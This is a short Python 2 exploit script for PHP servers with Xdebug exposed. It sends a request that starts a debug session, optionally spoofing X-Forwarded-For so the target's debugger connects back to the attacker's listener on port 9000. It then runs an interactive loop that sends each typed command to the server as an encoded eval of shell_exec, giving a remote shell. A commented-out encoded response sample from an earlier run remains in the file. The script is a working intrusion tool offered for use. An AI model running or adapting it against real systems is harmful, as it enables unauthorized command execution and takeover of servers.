#!/usr/bin/env python2

import socket
#from defusedxml.ElementTree import fromstring
import pipes
import sys

import argparse

import thread
import requests
from urlparse import urlparse, parse_qs
import random
import string

parser = argparse.ArgumentParser()
parser.add_argument('-l', '--local-host',
  help='local fqdn or IP address where xdebug will connect to on port 9000', default=None)
parser.add_argument('-u', '--url',
  help='url to activate xdebug on', default=None)
args = parser.parse_args()

sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sk.bind(('0.0.0.0', 9000))
sk.listen(10)

def rand_id(n=6):
  r = ''
  for i in range(n):
    r += random.choice(string.ascii_letters)
  return r

def start_xdebug(url, lhost):
  r = None
  if lhost is None:
    r = requests.get(url,
      params={'XDEBUG_SESSION_START': rand_id()},
    )
  else:
    r = requests.get(url,
      params={'XDEBUG_SESSION_START': rand_id()},
      headers={'X-Forwarded-For': lhost}
    )
  assert(r.status_code >= 200 and r.status_code < 300)

if args.url is not None:
  thread.start_new_thread(start_xdebug, (args.url, args.local_host))

conn, addr = sk.accept()

def pop_xdebug(client_data):
  (length, data, _) = client_data.split('\x00')
  length = int(length, 10)
  assert(len(data) == length)

  print(data)

  daatta = data.split("CDATA[")[1]
  daatta = daatta.split("]]")[0]
  return daatta

#  ![CDATA[TVRJekxuUjRkQXBqYjNKbENtTnlaWFJsTG1OemN3cGtkMlJrZDJRdWNHaHdDbVpoZG1samIyNHVhV052Q21sdVpHVjRMbkJvY0Fwc2Iyd2djR3g2SUdSdmJuUWdkSEpoYzJnZ2RHaHBjeUJtYjJ4a1pYSUtjR2h3TFhKbGRtVnljMlV0YzJobGJHd3VjR2h3Q25Ob1pXeHNMbk5vQ25wbGRYTXVhbkJuQ2c9PQ==]]

#  et = fromstring(data)
#  if '{urn:debugger_protocol_v1}property' in data:
#    return "puppa"
#  et = "poop"
#  property = et.find('{urn:debugger_protocol_v1}property')
#  if property is None: return

#  return property.text

# pop xdebug greeting
client_data = conn.recv(1024)
data = pop_xdebug(client_data)

#conn.sendall('eval -i 1 -- phpinfo()\x00')
#output = pop_xdebug(client_data).decode('base64').decode('base64')
#sys.stdout.write('%s' % output)

while True:
  try:
    data = raw_input('>> ')
  except EOFError:
    break

  data += ' 2>&1'
  php_command = 'base64_encode(shell_exec({}))'.format(pipes.quote(data))

  conn.sendall('eval -i 1 -- %s\x00' % php_command.encode('base64')) 

  client_data = conn.recv(16384)
  output = pop_xdebug(client_data).decode('base64').decode('base64')
  sys.stdout.write('%s' % output)

print('')
